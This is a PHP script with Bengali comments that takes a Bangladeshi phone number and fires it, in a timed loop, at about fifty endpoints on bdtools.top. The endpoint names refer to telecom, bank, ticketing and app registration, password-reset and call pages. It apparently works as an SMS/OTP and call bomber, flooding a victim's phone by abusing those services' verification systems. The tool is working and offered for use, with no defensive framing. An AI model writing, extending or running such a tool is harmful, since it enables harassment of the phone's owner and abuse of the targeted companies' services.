<?php
// api_request_sender.php

// ফোন নাম্বার ভেরিফাই করার ফাংশন
function validatePhone($phone) {
    return preg_match('/^01[3-9]\d{8}$/', $phone); // বাংলাদেশের ফোন নাম্বার ফরম্যাট
}

// API এ রিকোয়েস্ট পাঠানোর ফাংশন
function sendApiRequest($apiUrl, $phone) {
    $url = $apiUrl . '?phone=' . urlencode($phone);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'status' => ($httpCode == 200) ? 'success' : 'error',
        'code' => $httpCode,
        'response' => $response
    ];
}

// মেইন প্রসেসিং
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $phone = isset($_GET['phone']) ? trim($_GET['phone']) : '';
    
    if (empty($phone) || !validatePhone($phone)) {
        die(json_encode(['error' => 'Invalid Bangladeshi phone number. Use format: 01712345678']));
    }

    // আপনার API এন্ডপয়েন্ট লিস্ট (ছবিতে দেখানো ফাইলগুলো)
    $apiEndpoints = [
        'call.php',
        'airtel-care.php',
        'airtel-screen.php',
        'call2.php',
        'amiprobasi.php',
       'call4.php',
        'call5.php',
        'apex.php',
       'call6.php',
        'applink.php',
        'bdapps-forget.php',
        'bdapps-reg.php',
        'bdtikets.php',
        'binge.php',
        'bohubrihi.php',
        'boighor.php',
        'busbologin.php',
        'cineplex.php',
        'dbl.php',
        'dhakabank.php',
        'dipto.php',
        'e-testpaper.php',
        'easy.com.bd.php',
        'ecuriar.php',
        'ekshopbd.php',
        'engage.php',
        'engage-token.php',
        'fsibl.php',
        'fundesh.php',
        'gadgetandgear.php',
        'gamehub-forget.php',
        'gamehub-reg.php',
        'garibook.php',
        'ghuri.php',
        'gp-golden.php',
        'gp-star.php',
        'gpay.php',
        'gpfi.php',
        'gplivechat.php',
        'gplivechat-token.php',
        'gpwebsite.php',
        'helth+.php',
        'hisab-express.php',
        'iscreen.php',
        'iscreen-token.php',
        'joy-quiz.php',
        'mcomic.php',
        'medeasy.php',
        'medha.php',
        'mygp.php',
        'otthee.php',
        'ca.php',
        'robi-alpha.php'
    ];

    $baseUrl = 'https://bdtools.top/xxx/api/'; // আপনার বেস URL এখানে সেট করুন
    $results = [];
    
    foreach ($apiEndpoints as $endpoint) {
        $fullUrl = $baseUrl . $endpoint;
        $results[$endpoint] = sendApiRequest($fullUrl, $phone);
        
        // প্রতি রিকোয়েস্টের মধ্যে সামান্য বিরতি (অপশনাল)
        usleep(100000); // 0.1 সেকেন্ড
    }
    
    header('Content-Type: application/json');
    echo json_encode([
        'phone' => $phone,
        'total_requests' => count($apiEndpoints),
        'results' => $results
    ], JSON_PRETTY_PRINT);
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed. Use GET request.']);
}
?>